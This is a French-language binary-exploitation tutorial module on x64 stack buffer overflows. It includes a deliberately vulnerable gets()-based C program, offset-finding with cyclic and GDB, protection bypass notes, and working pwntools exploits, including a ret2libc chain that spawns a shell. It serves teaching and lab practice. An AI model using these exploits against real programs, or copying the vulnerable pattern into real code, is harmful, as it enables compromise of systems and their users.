# Module 27 - Stack Overflow x64 : Prendre le contrôle

## Pourquoi tu dois maîtriser ça

```c
// Buffer overflow classique
char buffer[64];
gets(buffer);  // Pas de limite → écrase la Return Address → RIP contrôlé → SHELL

// Ce qui se passe en mémoire
// Input: 'A'*72 + adresse_de_win()
// Résultat: le programme saute à win() au lieu de retourner normalement
```

**Le stack overflow est LA base de l'exploitation binaire.** Comprends ça, et tu comprends 80% des CVE système.

---

## La Stack en 30 secondes

> **Stack** = zone mémoire temporaire qui grandit vers le BAS (adresses décroissantes).

```
ADRESSES HAUTES (0x7fff...)
┌─────────────────────────┐
│  Arguments (si > 6)     │
├─────────────────────────┤
│  Return Address (8B)    │  ← CIBLE ! Écraser ça = contrôler RIP
├─────────────────────────┤
│  Saved RBP (8B)         │  ← Base pointer sauvegardé
├─────────────────────────┤
│                         │
│  Variables locales      │  ← char buffer[64] ici
│  (buffer, etc.)         │
│                         │
└─────────────────────────┘  ← RSP (sommet de la stack)
ADRESSES BASSES
```

---

## Registres critiques

| Registre | Nom | Rôle | Exploitation |
|----------|-----|------|--------------|
| **RSP** | Stack Pointer | Sommet de la stack | Diminue à chaque PUSH |
| **RBP** | Base Pointer | Base du frame | Repère fixe pour variables |
| **RIP** | Instruction Pointer | Prochaine instruction | **Notre cible finale** |

> **RIP** ne peut pas être modifié directement. On le contrôle en écrasant la **Return Address** sur la stack.

---

## Le mécanisme d'exploitation

### 1. Appel de fonction (call)

```asm
call fonction   ; Fait 2 choses:
                ; 1. push RIP (sauvegarde l'adresse de retour)
                ; 2. jmp fonction
```

### 2. Prologue de fonction

```asm
push rbp        ; Sauvegarde l'ancien RBP
mov rbp, rsp    ; Nouveau frame
sub rsp, 64     ; Alloue 64 bytes pour variables locales
```

### 3. Retour (ret)

```asm
leave           ; mov rsp, rbp + pop rbp
ret             ; pop rip ← C'EST ICI QU'ON EXPLOITE !
```

> **`ret`** pop la valeur au sommet de la stack dans RIP. Si on a écrasé cette valeur = on contrôle où le CPU saute.

---

## Calcul d'offset : La formule

```
Offset = Taille_Buffer + Padding + 8 (saved RBP)
```

**Exemple concret :**
```c
void vulnerable() {
    char buffer[64];  // 64 bytes
    gets(buffer);
}
// Offset = 64 + 0 + 8 = 72 bytes
```

**Payload :**
```python
payload = b'A' * 72 + p64(win_address)
#         └─────┬─────┘   └─────┬─────┘
#         Remplir tout     Nouvelle Return Address
```

---

## Trouver l'offset avec un pattern

### Méthode rapide (pwntools)

```bash
# Générer un pattern unique
python3 -c "from pwn import *; print(cyclic(100))"

# Envoyer au programme, noter l'adresse du crash
# Trouver l'offset
python3 -c "from pwn import cyclic_find; print(cyclic_find(0x6161616c6161616b, n=8))"
# Output: 72
```

### Avec GDB

```bash
gdb ./vuln
(gdb) run < pattern.txt
# Crash: SIGSEGV
(gdb) x/gx $rsp
0x7ffe...: 0x6161616c6161616b  # Valeur au sommet = partie du pattern
```

---

## Protections et bypass

### 1. Stack Canary (SSP)

> **Canary** = valeur secrète entre buffer et Return Address. Si modifiée → crash.

```
AVEC CANARY:
┌─────────────┐
│  buffer     │
├─────────────┤
│  CANARY     │  ← Valeur random (ex: 0x1234567890abcdef)
├─────────────┤
│  saved RBP  │
├─────────────┤
│  ret addr   │
└─────────────┘

Avant ret: if (canary != original) → __stack_chk_fail()
```

**Détection :**
```bash
checksec --file=./program
# Canary: found / No canary found
```

**Bypass :**
- Leak le canary (format string, read arbitrary)
- Bruteforce byte par byte (le dernier byte est toujours `\x00`)

### 2. NX/DEP (Non-Executable Stack)

> **NX** = la stack est RW mais pas X (pas exécutable). Shellcode sur stack → SIGSEGV.

**Détection :**
```bash
checksec --file=./program
# NX: NX enabled / NX disabled
```

**Bypass :**
- **ROP** (Return-Oriented Programming) : réutiliser du code existant
- **ret2libc** : appeler system("/bin/sh")

### 3. ASLR

> **ASLR** = randomise les adresses à chaque exécution. Stack, heap, libc à des endroits différents.

**Détection :**
```bash
cat /proc/sys/kernel/randomize_va_space
# 0=off, 1=partial, 2=full
```

**Bypass :**
- Information leak (fuiter une adresse, calculer les autres)
- Bruteforce (32-bit seulement, ~65K essais)

### 4. PIE

> **PIE** = le binaire lui-même est à une adresse random (plus de `0x400000` fixe).

**Détection :**
```bash
checksec --file=./program
# PIE: PIE enabled / No PIE
```

**Bypass :**
- Leak une adresse du binaire
- Calculer la base : `base = leaked_addr - known_offset`

---

## Exploit complet

### Programme vulnérable

```c
#include <stdio.h>
#include <stdlib.h>

void win() {
    printf("PWNED!\n");
    system("/bin/sh");
}

void vulnerable() {
    char buffer[64];
    printf("Input: ");
    gets(buffer);  // VULNÉRABLE
}

int main() {
    printf("win() @ %p\n", (void*)win);
    vulnerable();
    return 0;
}
```

**Compilation (sans protections pour apprendre) :**
```bash
gcc vuln.c -o vuln -fno-stack-protector -no-pie -z execstack
```

### Exploit Python (pwntools)

```python
#!/usr/bin/env python3
from pwn import *

binary = './vuln'
context.binary = binary

# Adresse de win() (affichée ou via objdump -d vuln | grep win)
win_addr = 0x401136

# Payload
offset = 72
payload = b'A' * offset + p64(win_addr)

# Lancer et exploiter
p = process(binary)
p.recvuntil(b'Input: ')
p.sendline(payload)
p.interactive()
```

**Résultat :**
```
$ ./exploit.py
[+] Starting local process './vuln': pid 12345
PWNED!
$ whoami
user
```

---

## Debug avec GDB

```bash
gdb ./vuln

# Breakpoints utiles
(gdb) break vulnerable
(gdb) break *vulnerable+XX    # Sur le 'ret'

# Examiner la stack
(gdb) x/20gx $rsp             # 20 valeurs 64-bit depuis RSP
(gdb) info registers          # Tous les registres

# Après envoi du payload
(gdb) x/gx $rsp               # Vérifier que ret addr = win_addr
```

---

## Avec ASLR : ret2libc

Quand NX + ASLR sont activés, on fait un **ret2libc** :

```python
#!/usr/bin/env python3
from pwn import *

binary = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./vuln')

# Étape 1: Leak puts@libc
rop = ROP(binary)
rop.puts(binary.got['puts'])  # puts(puts@GOT)
rop.main()                     # Retourner à main

payload1 = b'A' * 72 + rop.chain()
p.sendline(payload1)

# Récupérer le leak
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f'puts@libc: {hex(puts_leak)}')

# Calculer base libc
libc.address = puts_leak - libc.symbols['puts']
log.info(f'libc base: {hex(libc.address)}')

# Étape 2: system("/bin/sh")
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')))

payload2 = b'A' * 72 + rop2.chain()
p.sendline(payload2)

p.interactive()
```

---

## Exercices pratiques

### Exo 1 : Trouver l'offset (5 min)
Compile le programme vulnérable et trouve l'offset exact avec cyclic.

### Exo 2 : Exploit basique (10 min)
Écris un exploit qui redirige vers `win()`.

### Exo 3 : Avec canary (15 min)
Compile avec `-fstack-protector` et trouve un moyen de leak le canary.

### Exo 4 : ret2libc (20 min)
Compile avec NX activé et exploite via ret2libc.

---

## Checklist

```
□ Je comprends le layout de la stack (buffer → saved RBP → ret addr)
□ Je sais calculer l'offset pour écraser Return Address
□ Je sais utiliser cyclic pour trouver l'offset
□ Je comprends les protections (Canary, NX, ASLR, PIE)
□ Je sais écrire un exploit basique avec pwntools
□ Je sais déboguer un exploit avec GDB
□ Je comprends ret2libc pour bypasser NX
```

---

## Glossaire express

| Terme | Définition |
|-------|------------|
| **Return Address** | Adresse où retourner après une fonction (notre cible) |
| **RSP/RBP/RIP** | Stack pointer / Base pointer / Instruction pointer |
| **Canary** | Valeur secrète qui détecte les overflows |
| **NX/DEP** | Stack non-exécutable |
| **ASLR** | Randomisation des adresses mémoire |
| **PIE** | Binaire à adresse random |
| **ret2libc** | Exploiter en appelant des fonctions libc |
| **ROP** | Chaîner des gadgets (petits bouts de code) |
| **p64()** | Convertir en little-endian 64-bit |

---

## Prochaine étape

**Module suivant →** [28 - ROP Chains x64](../28_rop_basics/)

---

**Temps lecture :** 10 min | **Pratique :** 45 min
